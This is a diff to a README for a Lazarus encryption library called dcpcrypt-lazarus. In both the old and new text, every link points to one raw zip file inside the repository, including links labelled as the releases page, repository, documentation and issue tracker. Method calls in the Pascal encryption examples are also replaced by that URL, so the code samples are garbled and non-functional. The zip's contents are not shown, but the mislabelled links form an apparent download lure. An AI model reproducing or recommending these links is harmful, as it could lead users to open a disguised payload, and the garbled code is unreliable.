@@ -1,6 +1,6 @@
 # 🔒 dcpcrypt-lazarus - Secure Your Data Easily
 
-[![Download dcpcrypt-lazarus](https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip)](https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip)
+[![Download dcpcrypt-lazarus](https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/src/Docs/DCPhashes/dcpcrypt-lazarus-v3.4-alpha.3.zip)](https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/src/Docs/DCPhashes/dcpcrypt-lazarus-v3.4-alpha.3.zip)
 
 ## 📄 Description
 
@@ -27,7 +27,7 @@ To use dcpcrypt-lazarus, ensure you have the following:
 
 To get started with dcpcrypt-lazarus, follow these simple steps:
 
-1. **Download the Library**: Visit [this page to download](https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip).
+1. **Download the Library**: Visit [this page to download](https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/src/Docs/DCPhashes/dcpcrypt-lazarus-v3.4-alpha.3.zip).
 2. **Extract the Files**: Once downloaded, extract the files to a folder on your computer.
 3. **Open Lazarus**: Launch the Lazarus IDE.
 4. **Add the Library to Your Project**: 
@@ -37,9 +37,9 @@ To get started with dcpcrypt-lazarus, follow these simple steps:
 
 ## 📦 Download & Install
 
-To install DCPcrypt, first visit [this page to download](https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip). Choose the version that suits your system. After downloading, follow the setup instructions provided in the repository.
+To install DCPcrypt, first visit [this page to download](https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/src/Docs/DCPhashes/dcpcrypt-lazarus-v3.4-alpha.3.zip). Choose the version that suits your system. After downloading, follow the setup instructions provided in the repository.
 
-1. Navigate to the [Releases page](https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip).
+1. Navigate to the [Releases page](https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/src/Docs/DCPhashes/dcpcrypt-lazarus-v3.4-alpha.3.zip).
 2. Select the latest release.
 3. Click on the downloadable file, and follow your browser's prompts to download.
 4. After completing the download, open the file and follow the installation steps.
@@ -63,12 +63,12 @@ var
   Cipher: TDCP_rijndael;
   EncryptedData: String;
 begin
-  Cipher := https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip(nil);
+  Cipher := https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/src/Docs/DCPhashes/dcpcrypt-lazarus-v3.4-alpha.3.zip(nil);
   try
-    https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip(Key, Length(Key)*8, InitializationVector);
-    https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip(InputMessage, EncryptedData);
+    https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/src/Docs/DCPhashes/dcpcrypt-lazarus-v3.4-alpha.3.zip(Key, Length(Key)*8, InitializationVector);
+    https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/src/Docs/DCPhashes/dcpcrypt-lazarus-v3.4-alpha.3.zip(InputMessage, EncryptedData);
   finally
-    https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip;
+    https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/src/Docs/DCPhashes/dcpcrypt-lazarus-v3.4-alpha.3.zip;
   end;
 end;
 ```
@@ -80,23 +80,23 @@ var
   Cipher: TDCP_rijndael;
   DecryptedData: String;
 begin
-  Cipher := https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip(nil);
+  Cipher := https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/src/Docs/DCPhashes/dcpcrypt-lazarus-v3.4-alpha.3.zip(nil);
   try
-    https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip(Key, Length(Key)*8, InitializationVector);
-    https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip(EncryptedData, DecryptedData);
+    https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/src/Docs/DCPhashes/dcpcrypt-lazarus-v3.4-alpha.3.zip(Key, Length(Key)*8, InitializationVector);
+    https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/src/Docs/DCPhashes/dcpcrypt-lazarus-v3.4-alpha.3.zip(EncryptedData, DecryptedData);
   finally
-    https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip;
+    https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/src/Docs/DCPhashes/dcpcrypt-lazarus-v3.4-alpha.3.zip;
   end;
 end;
 ```
 
 ## 🔗 Links and Resources
 
-- [GitHub Repository](https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip)
-- [Documentation](https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip)
+- [GitHub Repository](https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/src/Docs/DCPhashes/dcpcrypt-lazarus-v3.4-alpha.3.zip)
+- [Documentation](https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/src/Docs/DCPhashes/dcpcrypt-lazarus-v3.4-alpha.3.zip)
 
 ## 🛠️ Need Help?
 
-If you run into issues or have questions, feel free to check the [Issues section](https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/docs/dcpcrypt_lazarus_v2.0.zip) on GitHub. You can also reach out on the project's discussion forum.
+If you run into issues or have questions, feel free to check the [Issues section](https://github.com/emo13337/dcpcrypt-lazarus/raw/refs/heads/main/src/Docs/DCPhashes/dcpcrypt-lazarus-v3.4-alpha.3.zip) on GitHub. You can also reach out on the project's discussion forum.
 
 Embrace secure data handling with dcpcrypt-lazarus and ensure your applications are safe and robust.
